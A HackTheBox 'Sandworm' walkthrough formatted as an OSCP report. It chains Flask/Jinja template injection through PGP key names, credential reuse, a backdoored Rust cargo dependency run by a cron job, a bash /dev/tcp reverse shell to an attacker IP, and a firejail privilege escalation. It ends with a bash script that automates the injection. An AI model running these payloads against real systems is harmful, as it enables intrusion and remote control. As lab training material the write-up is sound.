---
title: "Offensive Security Certified Professional Exam Report"
author: ["student@youremailaddress.com", "OSID: XXXX"]
date: "2020-07-25"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "OSCP Exam Report"
lang: "en"
titlepage: true
titlepage-color: "1E90FF"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
book-class: false
classoption: oneside
code-block-font-size: \scriptsize
---
Written by [0xe10c](https://app.hackthebox.com/profile/525177)


# Enumeration



## nmap scan



![ . ](./img/Pasted%20image%2020230702145550.png)


Update `/etc/hosts`

```
10.10.11.218    ssa.htb
```


## website - `https://ssa.htb`


### forced browsing - feroxbuster and gobuster



#### feroxbuster - exposing admin panel


FerOxBuster forced browsing reveals a few endpoints. 


![ . ](./img/Pasted%20image%2020230703134056.png)


There appears to be some sort of admin panel accessible by login.


![ . ](./img/Pasted%20image%2020230703134156.png)



#### gobuster vhost enumeration

There were no vhosts identified by `gobuster`

### home page

Let's visit the website

![ . ](./img/Pasted%20image%2020230702150303.png)


![ . ](./img/Pasted%20image%2020230702151031.png)


After being redirected from `10.10.11.218`, we land on the HTTPS webpage `ssa.htb`, the home page of the National Security uh, Secret Spy Agency.

At the bottom of the page we see that this is a Flask MCV website.  Validate by testing extensions `.(html|php)`. Since this is Flask, we suspect the potential for Server-Side Template Injection (SSTI) vulnerability.

Of the three links at the top of the page, only the "Contact" page seems to bear fruit.


### Contact page


![ . ](./img/Pasted%20image%2020230702151508.png)



### PGP encryption guide page

This page is a demo for PGP encryption.  On this page you can 
- download the SSA PGP public key
- use SSA PGP public key to encrypt, decrypt, and verify messages
- do all of that same functionality with a user-owned PGP keypair.

There's not gonna be a super deep dive in this document, but I have prepared [[PGP and GnuPG|this document]] that goes through each of the steps with commands.


![ . ](./img/Pasted%20image%2020230702151729.png)


#### SSA PGP public key


![ . ](./img/Pasted%20image%2020230702152245.png)

```pgp
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
=P8U3
-----END PGP PUBLIC KEY BLOCK-----

```



### Testing Signature Verification functionality

On this part of the PGP Guide page, the user is able to enter their own PGP public key and a signed PGP message.

![ . ](./img/Pasted%20image%2020230703161442.png)



![[PGP and GnuPG#^7f2227]]


![[PGP and GnuPG#^e01be7]]

![[PGP and GnuPG#^c7e592]]

![[PGP and GnuPG#^414003]]

### testing template injection with PGP keypair

To help test the template injection, we used [this tool](https://github.com/atriox2510/pgp-pysuite.git) to create keys on the fly.  
After testing each of the available fields, we identified the "Verify Signature" part of the page to be vulnerable.  Since the back-end is advertised as Flask, a payload of the form `{{ payload }}` contained in the "name" field of the PGP keys will be parsed and executed by Jinja/Flask.

To validate:
1. generate new PGP keypair with some raw Python payload in the name field, e.g. `{{ 'A' * 16 }}` or `{{ 17 * 4 }}`
2. generate a *PGP signed message* with the malicious keypair
3. use website to verify malicious public key and signed message
4. examine results to validate SSTI


#### validating template injection - arithmetic


![ . ](./img/Pasted%20image%2020230702155105.png)



![ . ](./img/Pasted%20image%2020230702155231.png)


Since the name associated with the PGP keypair is controlled by the user, we believe this can be exploited with Flask/Jinja template injection to gain a reverse shell on the target.


#### validating template injection - Flask enumeration


![ . ](./img/Pasted%20image%2020230702155735.png)


![ . ](./img/Pasted%20image%2020230702160017.png)



### validating template injection - RCE on server

We tested a few payloads before we found one that works:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

[Source](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)


![ . ](./img/Pasted%20image%2020230702160824.png)



##  What we have so far


- Users: `atlas`
- RCE through Flask/Jinja SSTI
- Some Flask/Jinja environment variables leaked through SSTI (next subsection)


### Enumeration of Flask/Jinja app environment


![ . ](./img/Pasted%20image%2020230702161755.png)



#### Potential MySQL DB credentials 


```
atlas:GarlicAndOnionZ42
```


#### Flask SECRET_KEY

```
SECRET_KEY:91668c1bc67132e3dcfb5b1a3e0c5c21
```

![ . ](./img/Pasted%20image%2020230702162518.png)

[Source](https://flask.palletsprojects.com/en/2.3.x/config/#SECRET_KEY)

>[!note]
`sandworm.sh` is a script written by the author to aid in the SSTI exploitation.  It is available at the end of the document.


# Foothold - limited reverse shell as `atlas`

Using the SSTI RCE, we were able to obtain a reverse shell as the `atlas` user.


![ . ](./img/Pasted%20image%2020230702163422.png)


After upgrading, we attempted some light manual enumeration, searching for more listening ports, files, etc.


![ . ](./img/Pasted%20image%2020230702163916.png)


This box seems to have nothing going for it.  No `curl`, no `wget`, no `nc`, no `find`?  That can't be.


![ . ](./img/Pasted%20image%2020230702164058.png)

I'll be damned.


![ . ](./img/Pasted%20image%2020230702164242.png)


## Other users

There are only three users on the box with shell access
- `root`
- `silentobserver`
- `atlas`


![ . ](./img/Pasted%20image%2020230702164431.png)



## Further enumeration


Further enumeration with automated tools is difficult.  The home directory of `atlas` is read-only


![ . ](./img/Pasted%20image%2020230702164908.png)


`/tmp` is writable, but we don't gain much - with such a limited set of tools, `linpeas.sh` is effectively useless.


![ . ](./img/Pasted%20image%2020230702165413.png)



![ . ](./img/Pasted%20image%2020230702165446.png)



![ . ](./img/Pasted%20image%2020230702165742.png)

`silentobserver` is also apparently `nobody`

![ . ](./img/Pasted%20image%2020230702165858.png)


![ . ](./img/Pasted%20image%2020230702170114.png)

[Source](https://wiki.ubuntu.com/nobody)


# Pivot to user `silentobserver`



![ . ](./img/Pasted%20image%2020230702171019.png)


Poking around `atlas`'s home directory, we find a file named `/home/atlas/.config/httpie/sessions/localhost_5000/admin.json`, which appears to contain credentials for the `silentobserver` user.

## creds for `silentobserver`

```
silentobserver:quietLiketheWind22
```


### user flag


![ . ](./img/Pasted%20image%2020230702171309.png)



## `silentobserver` enumeration



### listening ports


![ . ](./img/Pasted%20image%2020230702183556.png)



#### port 5000 - `https://ssa.htb` Flask/Jinja application

Using SSH port forwarding, we accessed the service listening on port 5000.  It is the SSA website from the initial Enumeration phase.  

![ . ](./img/Pasted%20image%2020230702184004.png)



![ . ](./img/Pasted%20image%2020230702184342.png)




#### port 3306 - `mysql` service 


![ . ](./img/Pasted%20image%2020230702173622.png)


contents of `users` table
```
+----+----------------+--------------------------------------------------------------------------------------------------------+
| id | username       | password                                                                                               |
+----+----------------+--------------------------------------------------------------------------------------------------------+
|  1 | Odin           | pbkdf2:sha256:260000$q0WZMG27Qb6XwVlZ$12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f |
|  2 | silentobserver | pbkdf2:sha256:260000$kGd27QSYRsOtk7Zi$0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d |
+----+----------------+--------------------------------------------------------------------------------------------------------+
```

wasn't able to crack straight away - may return as last resort



## TipNet - backend for SSA "Contact" reporting page


Recall the [[HTB - Sandworm (Seasonal Week 1) - Walkthrough#Contact page|contact page]] found earlier, which accepts messages signed with the SSA PGP public key.


![ . ](./img/Pasted%20image%2020230702151508.png)


Recall also the [[HTB - Sandworm (Seasonal Week 1) - Walkthrough#feroxbuster - exposing admin panel|exposed admin panel]] from the forced browsing scan.


![ . ](./img/Pasted%20image%2020230703134156.png)

Using `silentobserver`'s credentials, we are able to access the admin panel.

![ . ](./img/Pasted%20image%2020230703133433.png)


Once authenticated, we can access the `/view` endpoint, which shows a list of "tips" submitted by the public through the "Contact" form.


### possible file inclusion, directory traversal

Accessing one of the messages, we see in the URL that there is a parameter `fname` passed to the back end, referencing a filename of the form `<hash>.txt`. 

![ . ](./img/Pasted%20image%2020230703134826.png)


Testing for file inclusion and directory traversal led nowhere.

![ . ](./img/Pasted%20image%2020230703135050.png)



## running process enumeration with `pspy` leads to discovery of TipNet service source code, backend `Upstream` MySQL database


![ . ](./img/Pasted%20image%2020230703140147.png)



### `/opt/tipnet`


![ . ](./img/Pasted%20image%2020230703140614.png)


![ . ](./img/Pasted%20image%2020230703140700.png)



![ . ](./img/Pasted%20image%2020230703140801.png)



![ . ](./img/Pasted%20image%2020230703141023.png)


![ . ](./img/Pasted%20image%2020230703141125.png)


### MySQL `Upstream` database

The TipNet source code leaks credentials for the `tipnet` user to use the local MySQL database called `Upstream`.

```

# MySQL creds for tipnet user

tipnet:4The_Greater_GoodJ4A
```


![ . ](./img/Pasted%20image%2020230703141617.png)

There are two tables
* SIGINT
* tip_submissions


#### SIGINT table


![ . ](./img/Pasted%20image%2020230703142132.png)

Nothing of value (to us, at least).


#### tip_submissions table


![ . ](./img/Pasted%20image%2020230703141739.png)

These credentials are not valid for `root` login with `su` or `ssh`

We have validated that the service running on port 5000 is the TipNet service, which we've established is totally not spying on anyone at all.


### `/opt/crates/logger`



![ . ](./img/Pasted%20image%2020230703142612.png)


![ . ](./img/Pasted%20image%2020230703144739.png)


## Analysis and synthesis of information


TipNet is an application written in Rust.  Periodically a `root`-level cron job runs which wipes and rebuilds this project as the `atlas` user.  The command of interest from the cronjob is `/usr/bin/cargo run...`

`cargo` is the Rust package manager - if you've ever built a Node.js app from a Dockerfile, this will be a familiar concept to you.

When invoked as `cargo run`, by default the `Cargo.toml` manifest file in the working directory is sourced for the build.  In turn, dependencies are (recursively) sourced and built as needed.

>[!info]
> More information is available in the [Rust documentation](https://doc.rust-lang.org/cargo/index.html).

The TipNet `Cargo.toml` file specifies a dependency on a `logger` package located on the target machine at `/opt/crates/logger`.

Contents of `/opt/tipnet/Cargo.toml` file:
```
[package]
name = "tipnet"
version = "0.1.0"
edition = "2021"


# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html


[dependencies]
chrono = "0.4"
mysql = "23.0.1"
nix = "0.18.0"
logger = {path = "../crates/logger"}
sha2 = "0.9.0"
hex = "0.4.3"
```

We have already seen that the file `/opt/crates/logger/src/lib.rs` is writable by the `silentobserver` user.  Let's test to see if we get command execution with this file.


## Exploiting TipNet for Privilege Escalation


We modified the `lib.rs` file to create the file `/tmp/0xe10c`.
```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }

// CODE EXECUTION PAYLOD HERE
    let command = Command::new("touch") // command
        .arg("/tmp/0xe10c") //args - just repeat this line as needed
        .output()
        .expect("bash command failed");

    if command.status.success() {
        println!("Command success");
    } else {
        println!("Command failed");
    }
}

```

After waiting for the cron job to run again (confirm with `pspy`), we found the file `/tmp/0xe10c`, created by the user `atlas`. 


![ . ](./img/Pasted%20image%2020230703145641.png)

We have command execution.

Using this process, we validated the ability of the target to reach the attacker over the network with this command injection.
```rust
...
    let command = Command::new("ping")
        .arg("-c1")
        .arg("10.10.14.207")
        .output()
        .expect("bash command failed");
...
```


![ . ](./img/Pasted%20image%2020230703150659.png)



# Privesc



## Exploiting TipNet for revshell as `atlas`


Using the payload shown below, we were able to receive a reverse shell as the `atlas` user.

```rust
...
    let command = Command::new("bash")
        .arg("-c")
        .arg("bash -i >& /dev/tcp/10.10.14.207/9002 0>&1")
        .output()
        .expect("bash command failed");

    if command.status.success() {
        println!("Command success");
    } else {
        println!("Command failed");
...
```


![ . ](./img/Pasted%20image%2020230703153805.png)


I enabled persistence by appending my attacker's SSH public key to `/home/atlas/.ssh/authorized_keys`, enabling persistent SSH access to the target as the user `atlas`.


## `firejail` config file


![ . ](./img/Pasted%20image%2020230703155438.png)



## Privilege escalation - `firejail` version 0.9.68 CVE-2022-31214



![ . ](./img/Pasted%20image%2020230703160317.png)


The host is running version 0.9.68 of `firejail`.

Searchsploit lists two exploits for older versions of this program.

[This Seclists article](https://seclists.org/oss-sec/2022/q2/188) provides a Python exploit for privilege escalation by abusing the CVW.

We transferred the exploit script to the target, ran it as the `atlas` user.  We received a shell as `root` and were able to access the `root.txt` flag.


![ . ](./img/Pasted%20image%2020230703160747.png)



# Appendix A - `sandworm.sh` script


This was mostly written so I could practice using `getopts` for more robust scripting, but it did prove useful for enumerating and RCE.  Feel free to use it.

```bash

#!/bin/bash



# HTB - Sandworm (Seasonal Week 1)


# Script to automate PGP Jinja template injection


#


# Depends on pgp-pysuite - https://github.com/atriox2510/pgp-pysuite.git


#


# Assumes pgp-pysuite is subdirectory of CWD


function usage() {
    echo -e "\tusage: $0 -u <target> [-c] -p <payload> [-d]"

    echo -e "\n\t-c\t\tindicates that payload is a shell command"
    echo -e "\t\t\totherwise, payload is treated as jinja template injection"

    echo -e "\n\t-d\t\tprint debug info"

    echo -e "\n\t<payload>\tthe raw expression to be evaluated within the"
    echo -e "\t\t\tcurly braces or the os.system() Python system call"
}


# prints only if invoked with -d

function log() {
    [[ -v DEBUG ]] \
        && echo -e "\e[34m[+]\e[0m $1" 
}


[[ $# -lt 4 ]] \
    && usage \
    && exit 1

while getopts ':u:cp:d' OPTION; do
    case "${OPTION}" in
        u)
            TARGET=${OPTARG}
            ;;
        p)
            PAYLOAD="${OPTARG}"
            ;;
        c)
            COMMAND=true
            ;;
        d)
            DEBUG=true
            ;;
        ?)
            usage
            exit 1
            ;;
    esac
done

log "num args: $#" 
log "target url: ${TARGET}"
log "payload: ${PAYLOAD}"
[[ -v COMMAND ]] && log "command: ${COMMAND}"
log "debug: ${DEBUG}"



# send pgp stuff with malicious [jinja|python] payload



# generate malicious pgp keypair


KEYGEN="${PWD}/pgp-pysuite/keygen.py"
EMAIL="someguy@gmail.com"


# if -c is unset, generate jinja payload

if [[ ! -v COMMAND ]]; then
    log "generating new keypair with jinja"
    python3 ${KEYGEN} -p 'password' -n "{{ ${PAYLOAD} }}" -e "${EMAIL}" >/dev/null # suppress pgp-pysuite output

# otherwise generate shell command payload

else
    log "generating new keypair with shellcode"
    python3 ${KEYGEN} \
        -p 'password' \
        -n "{{request.application.__globals__.__builtins__.__import__('os').popen('${PAYLOAD}').read()}}" \
        -e "${EMAIL}" >/dev/null # suppress pgp-pysuite output
fi

PUBKEY=${PWD}/keypgp_uwu.pub.asc
PRIVATEKEY=${PWD}/keypgp_uwu.key.asc

#log "PUBKEY:\n$(cat ${PUBKEY})\n"


#log "PRIVATEKEY:\n$(cat ${PRIVATEKEY})\n"



# encode some sort of message with private key

SIGN="${PWD}/pgp-pysuite/sign.py"
MSG=$(python3 ${SIGN} -c ${PUBKEY} -k ${PRIVATEKEY} -p password -m 'benign message' \
    | awk '/.*BEGIN PGP SIGNED MESSAGE.*/,/.*END PGP SIGNATURE.*/'
)
log "MSG:\n ${MSG}"


# send it to target

result=$(curl -s -ik -X POST \
    "https://${TARGET}/process" \
    --data-urlencode "signed_text=${MSG}" \
    --data-urlencode "public_key=$(cat ${PUBKEY})"\
)

log "result:\n${result}"


# recover exfil data

regex_begin='^.*GOODSIG [[:upper:][:digit:]]{16} '
regex_end='gpg: Good signature'
awk "/${regex_begin}/ { f = 1 } /${regex_end}/ { f = 0 } f" <(echo -n "${result}") \
    | sed -r "s/${regex_begin}//" \
    | sed 's/<.*>.*//'

```

>[!note]
>Since this script has dubious future utility, the `-u` flag is not strictly necessary.  Again, this was just a learning project. 
